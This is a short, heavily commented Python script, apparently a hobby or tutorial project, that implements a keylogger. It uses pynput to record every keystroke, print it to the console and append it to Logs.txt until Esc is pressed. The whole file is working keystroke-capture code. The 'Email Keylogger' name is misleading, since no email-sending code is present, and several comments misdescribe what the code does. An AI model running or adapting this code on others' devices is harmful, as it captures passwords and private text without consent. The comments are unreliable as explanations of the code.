#Importing important libraries required to run this Email Keylogger

import pynput #Importing pynput module to fetching keyboard keys
from pynput.keyboard import * #Importing all modules pynput keyboard to increase program accurancy
#-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

#Main Keylogger functioning
#Creating an "Logs.txt" if not present otherwise opening it
file_obj=open("Logs.txt",'a') #Opening the file "Logs.txt" with the "append mode" to capture all the keys.

#Creating a function for "printing and writing keys" to our file i.e "Logs.txt"
def pressed(key): #"Taking key" as an "argument"
    print(key) #"Printing keys" on "console"
    file_obj.write(str(key)) #"Writing Keys" to "Logs.txt"

#Creating a function for closing the Email Keylogger wiht the appropriate key
def released(key): #"Taking key" as a "argument"
    if key==Key.esc: #When "key" is equal to "Key.esc" i.e escape key
        return False #If the condition is "true then program will run" and if "false program will quit"

#Creating a listener to Fetching the keys and then appending to a file.
with Listener(on_press=pressed,on_release=released) as l: #Taking pressed and released function as a argument with the functions "on_press" and "on_release"
    l.join() #Calling the "join" function for "concatenation of the keys".

#file_obj.close() #Can be used if we want open the file in append mode

